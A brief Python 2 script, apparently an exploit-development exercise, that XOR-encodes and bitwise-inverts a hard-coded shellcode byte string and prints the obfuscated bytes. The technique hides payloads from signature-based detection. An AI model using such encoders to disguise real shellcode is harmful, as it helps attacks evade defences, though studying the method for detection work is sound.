#!/usr/bin/python

# Python XOR Encoder 

shellcode=("\x24\x18\x7b\x24\x7b\x73\x33\x28\x24\x5d\x17\x31\x34\x37\x17\x17\x39\x34\x29\x2a\x2f\x35\x1d\x2c\x07\x02");
encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# XOR Encoding 	
	y = x^0xee
	b = ~y
	
	encoded += '\\x' 
	encoded += '%02x' % (b & 0xff)

	encoded2 += '0x'
	encoded2 += '%02x,' %(b & 0xff)


print str(encoded)

print encoded2

print 'Len: %d' % len(bytearray(shellcode))


